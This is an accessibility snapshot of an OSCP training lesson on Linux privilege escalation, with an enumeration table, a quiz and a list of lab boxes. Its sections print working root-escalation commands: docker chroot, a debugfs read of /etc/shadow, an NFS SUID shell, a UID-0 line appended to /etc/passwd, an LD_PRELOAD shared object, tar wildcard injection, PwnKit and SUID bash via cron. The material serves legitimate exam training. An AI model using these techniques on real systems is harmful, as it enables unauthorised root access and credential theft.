@@ -1,0 +1,556 @@
+- generic [active] [ref=f1e1]:
+  - navigation "Course sections" [ref=f1e2]:
+    - button "Sections" [ref=f1e3] [cursor=pointer]:
+      - generic [ref=f1e4]: ▾
+      - text: Sections
+  - navigation [ref=f1e5]:
+    - text: OSCP Course ·
+    - link "Links" [ref=f1e6] [cursor=pointer]:
+      - /url: ../reference/links.html
+    - text: ·
+    - link "Lesson 05" [ref=f1e7] [cursor=pointer]:
+      - /url: ./0005-exploiting-the-web-foothold.html
+    - text: ·
+    - strong [ref=f1e8]: Lesson 06
+    - text: ·
+    - link "Linux privesc" [ref=f1e9] [cursor=pointer]:
+      - /url: ../reference/linux-privesc.html
+    - text: ·
+    - link "Glossary" [ref=f1e10] [cursor=pointer]:
+      - /url: ../reference/glossary.html
+  - text: Lesson 06 · Privilege Escalation
+  - heading "Linux Privilege Escalation" [level=1] [ref=f1e11]
+  - paragraph [ref=f1e12]: "Mission: pass the OSCP+ exam · Your win today: take a low-priv shell to root by finding the one misconfiguration."
+  - paragraph [ref=f1e13]:
+    - text: You have a shell as
+    - code [ref=f1e14]: www-data
+    - text: ". That's 10 points; root is the other 10. The good news: privilege escalation is the same skill you already drilled in Lesson 03 —"
+    - strong [ref=f1e15]: enumeration
+    - text: — just pointed inward. You don't need a clever exploit. You need to find the
+    - emphasis [ref=f1e16]: one
+    - text: thing this box got wrong, and the box almost always got something wrong. You already understand processes, file permissions, and how a loader resolves a library; privesc is just learning which of those an attacker leans on.
+  - generic [ref=f1e17]:
+    - text: You don't have to break everything.
+    - text: You just have to find one misconfiguration.
+  - heading "Step 0 · Stabilise your shell first" [level=2] [ref=f1e18]
+  - paragraph [ref=f1e19]:
+    - text: "A foothold shell from a web exploit is usually a dumb pipe: no tab-completion, no arrow keys, no job control, and it dies the moment you fat-finger Ctrl-C. Fix that"
+    - emphasis [ref=f1e20]: before
+    - text: "you start hunting — half-typed commands and a dropped shell waste real exam minutes. Upgrade to a proper TTY:"
+  - generic [ref=f1e21]: "$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")' # real bash $ Ctrl-Z # background it $ stty raw -echo; fg # hand your terminal to the shell $ export TERM=xterm; export SHELL=/bin/bash # now clear/less/vi behave"
+  - paragraph [ref=f1e22]:
+    - text: Now you have history, completion, and a shell that survives a stray keypress.
+    - emphasis [ref=f1e23]: Then
+    - text: start enumerating.
+  - heading "Step 1 · Situate yourself" [level=2] [ref=f1e24]
+  - paragraph [ref=f1e25]: "Before hunting, know where you stand. Three commands answer \"who am I and what can I already do?\" — and the first one alone solves a huge share of OSCP boxes:"
+  - generic [ref=f1e26]: "$ sudo -l # what may I run as root? (the cheapest win) $ id; whoami # my user, groups (docker? lxd? disk? = a path) $ uname -a # kernel + arch (note it, don't rush to exploit)"
+  - heading "Step 2 · Enumerate broadly — then read the output" [level=2] [ref=f1e27]
+  - paragraph [ref=f1e28]:
+    - text: Run
+    - link "LinPEAS" [ref=f1e29] [cursor=pointer]:
+      - /url: https://github.com/peass-ng/PEASS-ng
+    - text: to sweep the host fast, but
+    - emphasis [ref=f1e30]: read
+    - text: "what it flags rather than outsourcing your judgement. The vectors it surfaces are almost always one of these:"
+  - table [ref=f1e31]:
+    - rowgroup [ref=f1e32]:
+      - row "Vector The tell The move" [ref=f1e33]:
+        - columnheader "Vector" [ref=f1e34]
+        - columnheader "The tell" [ref=f1e35]
+        - columnheader "The move" [ref=f1e36]
+    - rowgroup [ref=f1e37]:
+      - row "sudo rights sudo -l lists an allowed binary Look it up on GTFOBins → spawn a root shell" [ref=f1e38]:
+        - cell "sudo rights" [ref=f1e39]:
+          - strong [ref=f1e40]: sudo rights
+        - cell "sudo -l lists an allowed binary" [ref=f1e41]:
+          - code [ref=f1e42]: sudo -l
+          - text: lists an allowed binary
+        - cell "Look it up on GTFOBins → spawn a root shell" [ref=f1e43]:
+          - text: Look it up on
+          - link "GTFOBins" [ref=f1e44] [cursor=pointer]:
+            - /url: https://gtfobins.github.io/
+          - text: → spawn a root shell
+      - row "SUID binary find / -perm -4000 shows an odd one GTFOBins the binary → run as its owner (root)" [ref=f1e45]:
+        - cell "SUID binary" [ref=f1e46]:
+          - strong [ref=f1e47]: SUID binary
+        - cell "find / -perm -4000 shows an odd one" [ref=f1e48]:
+          - code [ref=f1e49]: find / -perm -4000
+          - text: shows an odd one
+        - cell "GTFOBins the binary → run as its owner (root)" [ref=f1e50]
+      - row "Cron job A root cron runs a script you can write Inject your command into the script; wait for the run" [ref=f1e51]:
+        - cell "Cron job" [ref=f1e52]:
+          - strong [ref=f1e53]: Cron job
+        - cell "A root cron runs a script you can write" [ref=f1e54]:
+          - text: A root cron runs a script
+          - emphasis [ref=f1e55]: you can write
+        - cell "Inject your command into the script; wait for the run" [ref=f1e56]
+      - row "Capabilities getcap -r / shows cap_setuid Abuse it (e.g. a Python with setuid) to become root" [ref=f1e57]:
+        - cell "Capabilities" [ref=f1e58]:
+          - strong [ref=f1e59]: Capabilities
+        - cell "getcap -r / shows cap_setuid" [ref=f1e60]:
+          - code [ref=f1e61]: getcap -r /
+          - text: shows
+          - code [ref=f1e62]: cap_setuid
+        - cell "Abuse it (e.g. a Python with setuid) to become root" [ref=f1e63]
+      - row "Writable path / PATH Root script calls a binary by relative name Plant your own binary earlier in PATH" [ref=f1e64]:
+        - cell "Writable path / PATH" [ref=f1e65]:
+          - strong [ref=f1e66]: Writable path / PATH
+        - cell "Root script calls a binary by relative name" [ref=f1e67]
+        - cell "Plant your own binary earlier in PATH" [ref=f1e68]:
+          - text: Plant your own binary earlier in
+          - code [ref=f1e69]: PATH
+      - row "Stray credentials Passwords in configs, history, .ssh keys Reuse them — su, SSH, or sudo as that user" [ref=f1e70]:
+        - cell "Stray credentials" [ref=f1e71]:
+          - strong [ref=f1e72]: Stray credentials
+        - cell "Passwords in configs, history, .ssh keys" [ref=f1e73]:
+          - text: Passwords in configs, history,
+          - code [ref=f1e74]: .ssh
+          - text: keys
+        - cell "Reuse them — su, SSH, or sudo as that user" [ref=f1e75]:
+          - text: Reuse them —
+          - code [ref=f1e76]: su
+          - text: ", SSH, or sudo as that user"
+      - row "Group membership id shows docker, lxd, or disk Mount or read the host filesystem as root" [ref=f1e77]:
+        - cell "Group membership" [ref=f1e78]:
+          - strong [ref=f1e79]: Group membership
+        - cell "id shows docker, lxd, or disk" [ref=f1e80]:
+          - code [ref=f1e81]: id
+          - text: shows
+          - code [ref=f1e82]: docker
+          - text: ","
+          - code [ref=f1e83]: lxd
+          - text: ", or"
+          - code [ref=f1e84]: disk
+        - cell "Mount or read the host filesystem as root" [ref=f1e85]
+      - row "NFS export /etc/exports has no_root_squash Drop a root-owned SUID shell from your box" [ref=f1e86]:
+        - cell "NFS export" [ref=f1e87]:
+          - strong [ref=f1e88]: NFS export
+        - cell "/etc/exports has no_root_squash" [ref=f1e89]:
+          - code [ref=f1e90]: /etc/exports
+          - text: has
+          - code [ref=f1e91]: no_root_squash
+        - cell "Drop a root-owned SUID shell from your box" [ref=f1e92]
+      - row "Writable /etc/passwd The file is group/world-writable Append a UID-0 user with a known password" [ref=f1e93]:
+        - cell "Writable /etc/passwd" [ref=f1e94]:
+          - strong [ref=f1e95]: Writable /etc/passwd
+        - cell "The file is group/world-writable" [ref=f1e96]
+        - cell "Append a UID-0 user with a known password" [ref=f1e97]
+      - row "sudo env_keep sudo -l keeps LD_PRELOAD / LD_LIBRARY_PATH Preload a malicious .so into the root command" [ref=f1e98]:
+        - cell "sudo env_keep" [ref=f1e99]:
+          - strong [ref=f1e100]: sudo env_keep
+        - cell "sudo -l keeps LD_PRELOAD / LD_LIBRARY_PATH" [ref=f1e101]:
+          - code [ref=f1e102]: sudo -l
+          - text: keeps
+          - code [ref=f1e103]: LD_PRELOAD
+          - text: /
+          - code [ref=f1e104]: LD_LIBRARY_PATH
+        - cell "Preload a malicious .so into the root command" [ref=f1e105]:
+          - text: Preload a malicious
+          - code [ref=f1e106]: .so
+          - text: into the root command
+      - row "Wildcard injection Root script runs tar/chown/rsync * in a dir you own Plant filenames that become command-line flags" [ref=f1e107]:
+        - cell "Wildcard injection" [ref=f1e108]:
+          - strong [ref=f1e109]: Wildcard injection
+        - cell "Root script runs tar/chown/rsync * in a dir you own" [ref=f1e110]:
+          - text: Root script runs
+          - code [ref=f1e111]: tar/chown/rsync *
+          - text: in a dir you own
+        - cell "Plant filenames that become command-line flags" [ref=f1e112]
+      - row "pkexec / Polkit SUID pkexec present, host unpatched (pre-2022) PwnKit (CVE-2021-4034) → near-universal local root" [ref=f1e113]:
+        - cell "pkexec / Polkit" [ref=f1e114]:
+          - strong [ref=f1e115]: pkexec / Polkit
+        - cell "SUID pkexec present, host unpatched (pre-2022)" [ref=f1e116]:
+          - text: SUID
+          - code [ref=f1e117]: pkexec
+          - text: present, host unpatched (pre-2022)
+        - cell "PwnKit (CVE-2021-4034) → near-universal local root" [ref=f1e118]
+      - row "Kernel exploit Old uname -a + a matching CVE Last resort — can crash the box" [ref=f1e119]:
+        - cell "Kernel exploit" [ref=f1e120]:
+          - strong [ref=f1e121]: Kernel exploit
+        - cell "Old uname -a + a matching CVE" [ref=f1e122]:
+          - text: Old
+          - code [ref=f1e123]: uname -a
+          - text: + a matching CVE
+        - cell "Last resort — can crash the box" [ref=f1e124]:
+          - emphasis [ref=f1e125]: Last resort
+          - text: — can crash the box
+  - generic [ref=f1e126]:
+    - generic [ref=f1e127]: Order matters — don't reach for the kernel first
+    - text: "Work cheap-and-safe before risky:"
+    - strong [ref=f1e128]: sudo -l and stray creds → SUID / SGID / capabilities / cron → group / NFS / PATH → kernel and pkexec last
+    - text: . A kernel exploit can panic the box and cost you the machine (and exam time); a memory-corruption local root like PwnKit is more reliable but still a real exploit, so try the misconfigurations first. Most OSCP boxes fall to a config mistake, not a CVE.
+  - heading "More paths to root — the exact moves" [level=2] [ref=f1e129]
+  - paragraph [ref=f1e130]:
+    - text: The table is the map; here are the commands for the vectors a software engineer hasn't usually seen before. Each one is a
+    - strong [ref=f1e131]: misconfiguration
+    - text: ", not a memory bug, so they're reliable and exam-safe."
+  - heading "Dangerous group membership (docker / lxd / disk)" [level=3] [ref=f1e132]
+  - paragraph [ref=f1e133]:
+    - text: Some groups are
+    - emphasis [ref=f1e134]: root by design
+    - text: . If
+    - code [ref=f1e135]: id
+    - text: "puts you in one, you're effectively done:"
+  - generic [ref=f1e136]: "# docker group: run a container that bind-mounts the host root, then chroot in $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh # id uid=0(root) gid=0(root) # disk group: raw read/write to the disk device — read shadow without being root $ debugfs /dev/sda1 debugfs: cat /etc/shadow"
+  - paragraph [ref=f1e137]:
+    - text: The
+    - code [ref=f1e138]: lxd
+    - text: /
+    - code [ref=f1e139]: lxc
+    - text: "group is the same idea: import a tiny image, launch a"
+    - code [ref=f1e140]: security.privileged=true
+    - text: container, mount the host's
+    - code [ref=f1e141]: /
+    - text: inside it, and read or write root-owned files. Whenever you see one of these groups, stop and take the gift — it's worth the full 10 points.
+  - heading "NFS — no_root_squash" [level=3] [ref=f1e142]:
+    - text: NFS —
+    - code [ref=f1e143]: no_root_squash
+  - paragraph [ref=f1e144]:
+    - text: By default NFS "squashes" a remote root down to
+    - code [ref=f1e145]: nobody
+    - text: . With
+    - code [ref=f1e146]: no_root_squash
+    - text: ", a file you create as root"
+    - emphasis [ref=f1e147]: over the share
+    - text: "stays root-owned on the target. So craft a SUID-root shell from your attacker box and run it on the target:"
+  - generic [ref=f1e148]: "# on the target — find the misconfigured export $ cat /etc/exports /srv/share *(rw,no_root_squash) # on YOUR attacker box (as root) — mount it and plant a SUID shell # mount -o rw 10.10.10.5:/srv/share /mnt # printf 'int main(){setgid(0);setuid(0);system(\"/bin/bash\");}' > /mnt/r.c # gcc /mnt/r.c -o /mnt/rootsh && chmod +s /mnt/rootsh # back on the target — the binary is root-owned and SUID $ /srv/share/rootsh # id uid=0(root) gid=0(root)"
+  - paragraph [ref=f1e149]: Compile statically (or on the target) if the target's libc differs from your attacker box.
+  - heading "Writable /etc/passwd — add your own root" [level=3] [ref=f1e150]:
+    - text: Writable
+    - code [ref=f1e151]: /etc/passwd
+    - text: — add your own root
+  - paragraph [ref=f1e152]:
+    - text: If
+    - code [ref=f1e153]: /etc/passwd
+    - text: "is writable, you don't need to crack anyone — just add a second UID-0 account with a password you choose:"
+  - generic [ref=f1e154]: "$ openssl passwd -1 -salt xy hunter2 # make a crypt(3) hash $1$xy$8b1.../ $ echo 'pwn:$1$xy$8b1.../:0:0:root:/root:/bin/bash' >> /etc/passwd $ su pwn # password: hunter2 # id uid=0(root) gid=0(root)"
+  - paragraph [ref=f1e155]:
+    - text: The historical
+    - code [ref=f1e156]: x
+    - text: in the password field means "look in
+    - code [ref=f1e157]: /etc/shadow
+    - text: "\"; put a real hash there instead and the system trusts it. Adding an account is quieter than touching the existing"
+    - code [ref=f1e158]: root
+    - text: line — leave the real one alone.
+  - heading "LD_PRELOAD / LD_LIBRARY_PATH via sudo env_keep" [level=3] [ref=f1e159]:
+    - code [ref=f1e160]: LD_PRELOAD
+    - text: /
+    - code [ref=f1e161]: LD_LIBRARY_PATH
+    - text: via sudo
+    - code [ref=f1e162]: env_keep
+  - paragraph [ref=f1e163]:
+    - text: If
+    - code [ref=f1e164]: sudo -l
+    - text: shows
+    - code [ref=f1e165]: env_keep+=LD_PRELOAD
+    - text: (or
+    - code [ref=f1e166]: LD_LIBRARY_PATH
+    - text: ), sudo will carry that variable into the elevated command. The dynamic loader honours
+    - code [ref=f1e167]: LD_PRELOAD
+    - text: "for SUID-aware contexts here, so a shared object with a constructor runs as root:"
+  - generic [ref=f1e168]: "$ sudo -l env_keep+=LD_PRELOAD, (root) NOPASSWD: /usr/sbin/apache2ctl $ cat > /tmp/x.c <<'EOF' #include <stdlib.h> void _init(){ setgid(0); setuid(0); system(\"/bin/bash\"); } EOF $ gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c $ sudo LD_PRELOAD=/tmp/x.so /usr/sbin/apache2ctl # id uid=0(root) gid=0(root)"
+  - paragraph [ref=f1e169]:
+    - text: The command you target is irrelevant — the loader runs your
+    - code [ref=f1e170]: .so
+    - text: first, before
+    - code [ref=f1e171]: apache2ctl
+    - text: ever does anything.
+  - heading "Wildcard injection (tar / chown / rsync)" [level=3] [ref=f1e172]
+  - paragraph [ref=f1e173]:
+    - text: When a root script runs a command with a bare
+    - code [ref=f1e174]: "*"
+    - text: in a directory you can write to, the shell expands
+    - code [ref=f1e175]: "*"
+    - text: to your filenames — and many tools read filenames that start with
+    - code [ref=f1e176]: "-"
+    - text: as
+    - strong [ref=f1e177]: options
+    - text: . Name a file after a dangerous flag and you've injected an argument. Classic
+    - code [ref=f1e178]: tar
+    - text: "checkpoint trick:"
+  - generic [ref=f1e179]: "# root cron runs: cd /opt/backups && tar czf /root/bk.tgz * $ cd /opt/backups $ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > x.sh $ echo '' > '--checkpoint=1' $ echo '' > '--checkpoint-action=exec=sh x.sh' # next run: tar treats the filenames as flags and executes x.sh as root $ /tmp/rootbash -p # id euid=0(root)"
+  - paragraph [ref=f1e180]:
+    - text: The same shape works for
+    - code [ref=f1e181]: chown --reference=…
+    - text: and
+    - code [ref=f1e182]: rsync -e …
+    - text: . Whenever a privileged job globs files in your directory, you control its arguments.
+  - heading "pkexec / Polkit — PwnKit (CVE-2021-4034)" [level=3] [ref=f1e183]
+  - paragraph [ref=f1e184]:
+    - text: "One near-universal fallback:"
+    - strong [ref=f1e185]: PwnKit
+    - text: . The SUID
+    - code [ref=f1e186]: pkexec
+    - text: binary shipped on virtually every major distro and, before the January 2022 patch, a memory-corruption bug gave local root
+    - emphasis [ref=f1e187]: regardless of sudo or group config
+    - text: ". Confirm and fire:"
+  - generic [ref=f1e188]: "$ ls -l /usr/bin/pkexec -rwsr-xr-x 1 root root ... /usr/bin/pkexec # SUID set = candidate $ ./PwnKit # prebuilt exploit (one binary, no args) # id uid=0(root) gid=0(root)"
+  - paragraph [ref=f1e189]:
+    - text: It's reliable, but it
+    - emphasis [ref=f1e190]: is
+    - text: an exploit, not a misconfiguration — so it sits near the bottom of your order, just above a kernel CVE. Great when an old box has no obvious misconfig; never your first move.
+  - heading "Worked example — sudo to root in one line" [level=2] [ref=f1e191]
+  - paragraph [ref=f1e192]:
+    - text: The single most common OSCP Linux privesc.
+    - code [ref=f1e193]: sudo -l
+    - text: "returns:"
+  - generic [ref=f1e194]: "User www-data may run the following commands on host: (root) NOPASSWD: /usr/bin/find"
+  - paragraph [ref=f1e195]:
+    - link "GTFOBins → find" [ref=f1e196] [cursor=pointer]:
+      - /url: https://gtfobins.github.io/gtfobins/find/
+    - text: tells you
+    - code [ref=f1e197]: find
+    - text: can run a command via
+    - code [ref=f1e198]: "-exec"
+    - text: ". So:"
+  - generic [ref=f1e199]: "$ sudo find . -exec /bin/sh \\; -quit # id uid=0(root) gid=0(root) groups=0(root) # cat /root/proof.txt"
+  - paragraph [ref=f1e200]:
+    - text: "Root. Grab the proof file — that's the second 10 points. The pattern generalises:"
+    - emphasis [ref=f1e201]: find what you're allowed to run, then make it run a shell.
+  - heading "Worked example 2 — writable root cron → /bin/bash -p" [level=2] [ref=f1e202]:
+    - text: Worked example 2 — writable root cron →
+    - code [ref=f1e203]: /bin/bash -p
+  - paragraph [ref=f1e204]: "No sudo rights this time. LinPEAS flags a cron entry that runs as root, and the script it calls is world-writable — a permission mistake, not a vulnerability:"
+  - generic [ref=f1e205]: "$ cat /etc/crontab * * * * * root /usr/local/bin/backup.sh $ ls -l /usr/local/bin/backup.sh -rwxrwxrwx 1 root root 184 backup.sh # anyone can write it"
+  - paragraph [ref=f1e206]:
+    - text: Append a line that makes
+    - code [ref=f1e207]: bash
+    - text: itself SUID-root, then wait one tick and launch it with
+    - code [ref=f1e208]: "-p"
+    - text: "(which keeps the elevated euid instead of dropping it):"
+  - generic [ref=f1e209]: "$ echo 'chmod +s /bin/bash' >> /usr/local/bin/backup.sh # ...wait up to 60s for the next cron run... $ ls -l /bin/bash -rwsr-sr-x 1 root root ... /bin/bash $ /bin/bash -p bash-5.1# id uid=33(www-data) euid=0(root) gid=33(www-data) egid=0(root)"
+  - paragraph [ref=f1e210]:
+    - text: "Same lesson as the sudo example:"
+    - emphasis [ref=f1e211]: find something root runs, then make it run your code.
+    - text: Two boxes, two vectors, identical mindset.
+  - heading "Your enumeration order — a recap" [level=2] [ref=f1e212]
+  - paragraph [ref=f1e213]: When you land on a fresh box, walk this priority list top to bottom. Cheap and safe first; the things that can break the box are last.
+  - list [ref=f1e214]:
+    - listitem [ref=f1e215]:
+      - strong [ref=f1e216]: Stabilise your shell
+      - text: (TTY upgrade), then
+      - code [ref=f1e217]: sudo -l
+      - text: and a sweep for
+      - strong [ref=f1e218]: stray credentials
+      - text: (configs, history,
+      - code [ref=f1e219]: .ssh
+      - text: ", DB strings). The cheapest wins live here."
+    - listitem [ref=f1e220]:
+      - strong [ref=f1e221]: SUID / SGID binaries, capabilities, and writable cron
+      - text: —
+      - code [ref=f1e222]: find / -perm -4000
+      - text: ","
+      - code [ref=f1e223]: getcap -r /
+      - text: ", and any root job you can edit. Check each against"
+      - link "GTFOBins" [ref=f1e224] [cursor=pointer]:
+        - /url: https://gtfobins.github.io/
+      - text: .
+    - listitem [ref=f1e225]:
+      - strong [ref=f1e226]: Group membership, NFS exports, and writable PATH
+      - text: —
+      - code [ref=f1e227]: id
+      - text: for
+      - code [ref=f1e228]: docker
+      - text: /
+      - code [ref=f1e229]: lxd
+      - text: /
+      - code [ref=f1e230]: disk
+      - text: ","
+      - code [ref=f1e231]: /etc/exports
+      - text: for
+      - code [ref=f1e232]: no_root_squash
+      - text: ", and any script calling a binary by relative name."
+    - listitem [ref=f1e233]:
+      - strong [ref=f1e234]: Kernel exploit and pkexec/PwnKit — last.
+      - text: Only when the misconfigurations are exhausted, because they're real exploits that can crash or are noisy.
+  - heading "Check yourself" [level=2] [ref=f1e235]
+  - paragraph [ref=f1e236]: Pick the best move. Retrieve before reasoning — feedback below each.
+  - generic [ref=f1e237]:
+    - generic [ref=f1e238]:
+      - generic [ref=f1e239]: Q1.You just landed a low-priv shell on a Linux box. Which move is the cheapest first check for root?
+      - generic [ref=f1e240]:
+        - button "Reboot the box to clear its state" [ref=f1e241] [cursor=pointer]
+        - button "Brute-force the root account password" [ref=f1e242] [cursor=pointer]
+        - button "Compile a matching kernel exploit" [ref=f1e243] [cursor=pointer]
+        - button "Run sudo -l to list allowed commands" [ref=f1e244] [cursor=pointer]
+    - generic [ref=f1e245]:
+      - generic [ref=f1e246]: Q2.id shows you're a member of the docker group. What's the path to root?
+      - generic [ref=f1e247]:
+        - button "Wait for an admin to grant you sudo" [ref=f1e248] [cursor=pointer]
+        - button "Read the Docker API documentation" [ref=f1e249] [cursor=pointer]
+        - button "Restart the Docker daemon as root" [ref=f1e250] [cursor=pointer]
+        - button "Mount the host filesystem in a container" [ref=f1e251] [cursor=pointer]
+    - generic [ref=f1e252]:
+      - generic [ref=f1e253]: Q3.sudo -l shows env_keep+=LD_PRELOAD for a command you may run. What do you build?
+      - generic [ref=f1e254]:
+        - button "A wordlist of the user's old passwords" [ref=f1e255] [cursor=pointer]
+        - button "A static copy of the target's kernel" [ref=f1e256] [cursor=pointer]
+        - button "A cron job that fires on the next tick" [ref=f1e257] [cursor=pointer]
+        - button "A malicious shared object the loader preloads" [ref=f1e258] [cursor=pointer]
+    - generic [ref=f1e259]:
+      - generic [ref=f1e260]: "Q4./etc/exports lists a share with no_root_squash. From your attacker box you can:"
+      - generic [ref=f1e261]:
+        - button "Sniff cleartext credentials off the wire" [ref=f1e262] [cursor=pointer]
+        - button "Drop a root-owned SUID shell on the share" [ref=f1e263] [cursor=pointer]
+        - button "Reset the NFS daemon to its defaults" [ref=f1e264] [cursor=pointer]
+        - button "Read the kernel version of the target host" [ref=f1e265] [cursor=pointer]
+    - generic [ref=f1e266]:
+      - generic [ref=f1e267]: Q5.Which vector belongs LAST in your order because it can crash the box?
+      - generic [ref=f1e268]:
+        - button "Abusing a writable root cron job" [ref=f1e269] [cursor=pointer]
+        - button "Checking sudo -l for allowed commands" [ref=f1e270] [cursor=pointer]
+        - button "Reusing a password found in a config" [ref=f1e271] [cursor=pointer]
+        - button "A kernel exploit matching uname -a" [ref=f1e272] [cursor=pointer]
+    - generic [ref=f1e273]:
+      - generic [ref=f1e274]: "Q6./etc/passwd is world-writable. The fastest win is to:"
+      - generic [ref=f1e275]:
+        - button "Append a new user with UID 0" [ref=f1e276] [cursor=pointer]
+        - button "Delete the existing root entry" [ref=f1e277] [cursor=pointer]
+        - button "Comment out the nobody account" [ref=f1e278] [cursor=pointer]
+        - button "Change every shell to /bin/false" [ref=f1e279] [cursor=pointer]
+  - generic [ref=f1e280]:
+    - text: ▶ Primary source — bookmark these two
+    - link "GTFOBins" [ref=f1e281] [cursor=pointer]:
+      - /url: https://gtfobins.github.io/
+    - text: is the page you'll open most for Linux privesc — it tells you exactly how to abuse a sudo/SUID binary. Pair it with the
+    - link "HackTricks" [ref=f1e282] [cursor=pointer]:
+      - /url: https://book.hacktricks.wiki/
+    - text: Linux Privilege Escalation checklist for the full enumeration sweep.
+    - superscript [ref=f1e283]:
+      - link "1" [ref=f1e284] [cursor=pointer]:
+        - /url: "#s1"
+  - generic [ref=f1e285]:
+    - generic [ref=f1e286]: Do this before Lesson 07
+    - text: On a box where you already have a low-priv shell (from Lesson 05, or any easy box), run
+    - code [ref=f1e287]: sudo -l
+    - text: and LinPEAS, then escalate to root
+    - emphasis [ref=f1e288]: by hand
+    - text: via one vector — and on a second box, try a different one (cron, SUID, or a group). Record the exact path in your notes under "Privilege escalation". Owning a box end to end — foothold
+    - emphasis [ref=f1e289]: and
+    - text: root — is the whole exam in miniature.
+  - group [ref=f1e290]:
+    - generic "▸ 06 · Linux Privilege Escalation 6 boxes · core 0/2" [ref=f1e291] [cursor=pointer]:
+      - text: ▸
+      - generic [ref=f1e292]: 06 · Linux Privilege Escalation
+      - generic [ref=f1e293]: 6 boxes · core 0/2
+    - generic [ref=f1e294]:
+      - paragraph [ref=f1e295]: "Low-priv shell → root: sudo, SUID, cron, capabilities, writable files."
+      - list [ref=f1e296]:
+        - listitem [ref=f1e297]:
+          - generic [ref=f1e298]:
+            - generic [ref=f1e299] [cursor=pointer]:
+              - checkbox "Shocker" [ref=f1e300]
+              - generic [ref=f1e301]: Shocker
+            - generic [ref=f1e302]:
+              - generic [ref=f1e303]: HTB
+              - generic [ref=f1e304]: Linux
+              - generic [ref=f1e305]: Easy
+              - generic [ref=f1e306]: sudo GTFOBin
+              - generic [ref=f1e307]: Core
+              - link "0xdf ↗" [ref=f1e308] [cursor=pointer]:
+                - /url: https://0xdf.gitlab.io/2021/05/25/htb-shocker.html
+          - paragraph [ref=f1e309]: Shellshock CGI foothold → sudo perl GTFOBin → root.
+        - listitem [ref=f1e310]:
+          - generic [ref=f1e311]:
+            - generic [ref=f1e312] [cursor=pointer]:
+              - checkbox "Beep" [ref=f1e313]
+              - generic [ref=f1e314]: Beep
+            - generic [ref=f1e315]:
+              - generic [ref=f1e316]: HTB
+              - generic [ref=f1e317]: Linux
+              - generic [ref=f1e318]: Easy
+              - generic [ref=f1e319]: Many paths
+              - generic [ref=f1e320]: Core
+              - link "0xdf ↗" [ref=f1e321] [cursor=pointer]:
+                - /url: https://0xdf.gitlab.io/2021/02/23/htb-beep.html
+          - paragraph [ref=f1e322]: A dozen privesc paths in one box — ideal for interleaving vectors.
+        - listitem [ref=f1e323]:
+          - generic [ref=f1e324]:
+            - generic [ref=f1e325] [cursor=pointer]:
+              - checkbox "Traverxec" [ref=f1e326]
+              - generic [ref=f1e327]: Traverxec
+            - generic [ref=f1e328]:
+              - generic [ref=f1e329]: HTB
+              - generic [ref=f1e330]: Linux
+              - generic [ref=f1e331]: Easy
+              - generic [ref=f1e332]: Cron / SSH key
+              - generic [ref=f1e333]: Optional
+              - link "0xdf ↗" [ref=f1e334] [cursor=pointer]:
+                - /url: https://0xdf.gitlab.io/2020/04/11/htb-traverxec.html
+          - paragraph [ref=f1e335]: nostromo RCE → readable backup → journalctl/SSH-key path to root.
+        - listitem [ref=f1e336]:
+          - generic [ref=f1e337]:
+            - generic [ref=f1e338] [cursor=pointer]:
+              - checkbox "Clue" [ref=f1e339]
+              - generic [ref=f1e340]: Clue
+            - generic [ref=f1e341]:
+              - generic [ref=f1e342]: PG
+              - generic [ref=f1e343]: Linux
+              - generic [ref=f1e344]: Inter
+              - generic [ref=f1e345]: SUID / cron / caps
+              - generic [ref=f1e346]: Optional
+          - paragraph [ref=f1e347]: SUID / cron / capability chains; a PEAS-driven enumeration rep.
+        - listitem [ref=f1e348]:
+          - generic [ref=f1e349]:
+            - generic [ref=f1e350] [cursor=pointer]:
+              - checkbox "Bashed" [ref=f1e351]
+              - generic [ref=f1e352]: Bashed
+            - generic [ref=f1e353]:
+              - generic [ref=f1e354]: HTB
+              - generic [ref=f1e355]: Linux
+              - generic [ref=f1e356]: Easy
+              - generic [ref=f1e357]: ↻ Reused · L04
+              - link "0xdf ↗" [ref=f1e358] [cursor=pointer]:
+                - /url: https://0xdf.gitlab.io/2018/04/29/htb-bashed.html
+          - paragraph [ref=f1e359]: "The privesc half: sudo -l NOPASSWD → a writable root cron script → root."
+        - listitem [ref=f1e360]:
+          - generic [ref=f1e361]:
+            - generic [ref=f1e362] [cursor=pointer]:
+              - checkbox "Lame" [ref=f1e363]
+              - generic [ref=f1e364]: Lame
+            - generic [ref=f1e365]:
+              - generic [ref=f1e366]: HTB
+              - generic [ref=f1e367]: Linux
+              - generic [ref=f1e368]: Easy
+              - generic [ref=f1e369]: ↻ Reused · L01
+              - link "0xdf ↗" [ref=f1e370] [cursor=pointer]:
+                - /url: https://0xdf.gitlab.io/2020/04/07/htb-lame.html
+          - paragraph [ref=f1e371]: Baseline easy box — a warm-up before the misconfiguration vectors.
+      - paragraph [ref=f1e372]:
+        - text: Checkmarks are saved only in this browser (localStorage) — they won’t follow you to another device or browser.
+        - button "Reset this lesson" [ref=f1e373] [cursor=pointer]
+  - paragraph [ref=f1e374]:
+    - link "→ All lessons' boxes (full map)" [ref=f1e375] [cursor=pointer]:
+      - /url: ../reference/practice-boxes.html#pb-06
+  - generic [ref=f1e376]:
+    - text: I'm your teacher — ask me anything Paste me your
+    - code [ref=f1e377]: sudo -l
+    - text: ","
+    - code [ref=f1e378]: id
+    - text: ", or LinPEAS output and we'll spot the vector together. Next:"
+    - strong [ref=f1e379]: Lesson 07 — Windows privilege escalation
+    - text: — same mindset, different operating system (services, tokens, and the misconfigurations Windows loves).
+  - heading "Sources" [level=2] [ref=f1e380]
+  - list [ref=f1e381]:
+    - listitem [ref=f1e382]:
+      - link "GTFOBins" [ref=f1e383] [cursor=pointer]:
+        - /url: https://gtfobins.github.io/
+      - text: ·
+      - link "HackTricks (Linux PrivEsc)" [ref=f1e384] [cursor=pointer]:
+        - /url: https://book.hacktricks.wiki/
+      - text: ·
+      - link "LinPEAS" [ref=f1e385] [cursor=pointer]:
+        - /url: https://github.com/peass-ng/PEASS-ng
+      - text: ·
+      - link "Qualys — PwnKit (CVE-2021-4034)" [ref=f1e386] [cursor=pointer]:
+        - /url: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+      - text: ". Local commands:"
+      - link "Linux privesc cheatsheet" [ref=f1e387] [cursor=pointer]:
+        - /url: ../reference/linux-privesc.html
+      - text: .
+  - contentinfo [ref=f1e388]:
+    - 'link "← Lesson 05: Exploiting the Web Foothold" [ref=f1e390] [cursor=pointer]':
